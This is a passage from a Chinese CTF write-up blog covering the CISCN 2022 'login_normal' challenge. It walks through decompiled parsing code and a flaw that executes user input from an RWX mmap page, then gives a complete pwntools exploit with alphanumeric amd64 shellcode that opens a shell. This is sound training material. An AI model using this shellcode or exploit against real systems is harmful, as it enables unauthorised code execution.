class="built_in">strlen</span>(nptr) - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( dest )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        dest = <span class="built_in">calloc</span>(v9 + <span class="number">8</span>, <span class="number">1uLL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v9 &lt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memcpy</span>(dest, nptr, v9);</span><br><span class="line">    &#125;</span><br><span class="line">    ++v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一个判断就占大部分的代码段，建议放在逆向里（bushi</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )    <span class="comment">//判断次数即遍历次数</span></span><br><span class="line">    qword_202040[<span class="number">2</span> * v8] = ptr;</span><br><span class="line">sb = <span class="built_in">strchr</span>(ptr, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !sb )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">*sb = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ( sc = sb + <span class="number">1</span>; *sc &amp;&amp; (*sc == <span class="string">&#x27; &#x27;</span> || *sc == <span class="string">&#x27;\r&#x27;</span> || *sc == <span class="string">&#x27;\n&#x27;</span> || *sc == <span class="string">&#x27;\t&#x27;</span>); ++sc )<span class="comment">// 找到：之后的数据</span></span><br><span class="line">    *sc = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( !*sc )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;abort.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )</span><br><span class="line">    qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>] = sc;</span><br><span class="line">sd = <span class="built_in">strchr</span>(sc, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !sd )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line">*sd = <span class="number">0</span>;</span><br><span class="line">ptr = sd + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> ( *ptr == <span class="string">&#x27;\r&#x27;</span> )</span><br><span class="line">    *ptr++ = <span class="number">0</span>;</span><br><span class="line">ptr2 = (<span class="type">char</span> *)qword_202040[<span class="number">2</span> * v8];</span><br><span class="line">nptr = (<span class="type">char</span> *)qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>];</span><br></pre></td></tr></table></figure>

<p>首先qword_202040数组的第一个参数是传进来的字符串的开头，然后sb便是字符串中<code>：</code>的下一个字符，之后sc就是sb之后的正常的可读字符，然后qword_202040的第二个参数就是sc，即<code>：</code>后的可读字符，然后再找到sc之后即：后面的一个<code>\n</code>，存进sd里</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !strcasecmp(ptr2, <span class="string">&quot;opt&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( v7 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v7 = atoi(nptr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( strcasecmp(ptr2, <span class="string">&quot;msg&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(nptr) &lt;= <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = <span class="built_in">strlen</span>(nptr) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( dest )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    dest = <span class="built_in">calloc</span>(v9 + <span class="number">8</span>, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v9 &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(dest, nptr, v9);</span><br><span class="line">&#125;</span><br><span class="line">++v8;</span><br></pre></td></tr></table></figure>

<p>之后就是判断字符串的开头必须是msg或者opt然后跟上<code>：</code>，<code>：</code>之后就是dest或v7的值</p>
<p>从而得知格式要求：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opt:v7\nmsg:dest\n  或者msg:dest\nopt:v7\n</span><br></pre></td></tr></table></figure>

<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_DA8</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">isprint</span>(a1[i]) &amp;&amp; a1[i] != <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( unk_202028 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( unk_202024 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = getpagesize();</span><br><span class="line">    dest = (<span class="type">void</span> *)(<span class="type">int</span>)mmap((<span class="type">char</span> *)&amp;loc_FFE + <span class="number">2</span>, v1, <span class="number">7</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    <span class="built_in">memcpy</span>(dest, a1, v2);</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))dest)();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要求是unk_202024这个上面的值要为真，进而会执行dest上的函数，之前的mmap是为了让执行段可执行，映射到内存里，不然一直都在栈上显然是不可以执行的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_CBD</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">isprint</span>(a1[i]) &amp;&amp; a1[i] != <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;ro0t&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    unk_202028 = <span class="number">1</span>;</span><br><span class="line">    unk_202024 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    unk_202028 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>显然要先传进去ro0t但是它上面传输的字节其实是少传一个字节因此要多传一个无用字节</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc=ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">path=<span class="string">&#x27;./login2&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">amd64shell=<span class="string">b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>				:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>		:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> 						:p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content			:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content			:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content					:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content					:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> 						:p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content					:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr 				:info(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>====&gt;<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28735</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p,duan)</span><br><span class="line">            pause()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;msg:ro0tt\nopt:1\n&#x27;</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"><span class="comment">#shellcode=asm(shellcraft.sh())</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;opt:2\nmsg:&#x27;</span>+amd64shell+<span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">ru(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://s1nec-1o.github.io">s1nec-1o</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://s1nec-1o.github.io/2024/05/14/%E9%A2%98%E5%BD%951-01/">http://s1nec-1o.github.io/2024/05/14/%E9%A2%98%E5%BD%951-01/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://s1nec-1o.github.io" target="_blank">S1nec-1o's B1og</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/traditional-pwn/">traditional pwn</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/05/21/DIR-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="DIR-815漏洞复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">DIR-815漏洞复现</div></div></a></div><div class="next-post pull-right"><a href="/2024/05/12/%E9%A2%98%E5%BD%951-0/" title="题录1.0"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">题录1.0</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/02/01/2024-1-31-pwnable-bookwriter/" title="2024-1-31 pwnable_bookwriter"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-01</div><div class="title">2024-1-31 pwnable_bookwriter</div></div></a></div><div><a href="/2024/08/07/2024ciscn%E5%8D%8E%E4%B8%9C%E5%8D%97pwn/" title="2024ciscn华东南pwn"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-07</div><div class="title">2024ciscn华东南pwn</div></div></a></div><div><a href="/2024/01/27/2024-1-26%E6%B2%99%E7%9B%92%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="2024-1-26沙盒的学习"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-27</div><div class="title">2024-1-26沙盒的学习</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">s1nec-1o</div><div class="author-info__description">万事胜意</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">30</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="http://github.com/s1nec-1o"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">正在学习iot pwn 欢迎广大师傅与我交流</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952"><span class="toc-number">1.</span> <span class="toc-text">刷题记录2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LitCTF-2023-ezlogin"><span class="toc-number">2.</span> <span class="toc-text">[LitCTF 2023]ezlogin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">静态分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HZNUCTF-2023-preliminary-ffmt"><span class="toc-number">3.</span> <span class="toc-text">[HZNUCTF 2023 preliminary]ffmt</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90-1"><span class="toc-number">3.1.</span> <span class="toc-text">静态分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#de1ctf-2019-unprintable"><span class="toc-number">4.</span> <span class="toc-text">de1ctf_2019_unprintable</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90-2"><span class="toc-number">4.1.</span> <span class="toc-text">静态分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#d3ctf-2019-unprintablev"><span class="toc-number">5.</span> <span class="toc-text">d3ctf_2019_unprintablev</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E7%BA%BF%E4%B8%8B%E8%B5%9B-fmt"><span class="toc-number">6.</span> <span class="toc-text">[第六届强网拟态线下赛]fmt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FSCTF-2023-YS-START"><span class="toc-number">7.</span> <span class="toc-text">[FSCTF 2023]YS,START!</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3ida7-7%E5%8F%8D%E7%BC%96%E8%AF%91%E4%B8%8D%E4%BA%86"><span class="toc-number">7.0.1.</span> <span class="toc-text">如何解决ida7.7反编译不了</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CISCN-2022-%E5%88%9D%E8%B5%9B-login-normal"><span class="toc-number">8.</span> <span class="toc-text">[CISCN 2022 初赛]login_normal</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90-3"><span class="toc-number">8.1.</span> <span class="toc-text">静态分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%A0%BC%E5%BC%8F"><span class="toc-number">8.1.1.</span> <span class="toc-text">判断字符串格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">8.1.2.</span> <span class="toc-text">漏洞点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">8.2.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/11/CVE-2023-20073%E5%A4%8D%E7%8E%B0/" title="CVE-2023-20073复现">CVE-2023-20073复现</a><time datetime="2024-08-11T15:30:17.000Z" title="发表于 2024-08-11 23:30:17">2024-08-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/07/2024ciscn%E5%8D%8E%E4%B8%9C%E5%8D%97pwn/" title="2024ciscn华东南pwn">2024ciscn华东南pwn</a><time datetime="2024-08-07T02:21:24.000Z" title="发表于 2024-08-07 10:21:24">2024-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/05/%E8%B0%88%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" title="谈非栈上格式化字符串">谈非栈上格式化字符串</a><time datetime="2024-08-05T03:02:34.000Z" title="发表于 2024-08-05 11:02:34">2024-08-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/12/CVE-2023-26315/" title="CVE-2023-26315">CVE-2023-26315</a><time datetime="2024-07-12T08:55:37.000Z" title="发表于 2024-07-12 16:55:37">2024-07-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/09/TP-Link-SR20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="TP-Link SR20命令执行漏洞复现">TP-Link SR20命令执行漏洞复现</a><time datetime="2024-07-09T10:31:57.000Z" title="发表于 2024-07-09 18:31:57">2024-07-09</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281616326.png')"><div id="footer-wrap"><div class="copyright">&copy;2024 By s1nec-1o</div><div class="footer_custom_text">介是s1nec-1o的博客</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><div><canvas id="snow" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;pointer-events:none"></canvas></div><script>const notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));</script><script async type="text/javascript" src="https://cdn.jsdelivr.net/gh/Candinya/Kratos-Rebirth@latest/source/js/snow.min.js"></script><script async data-pjax 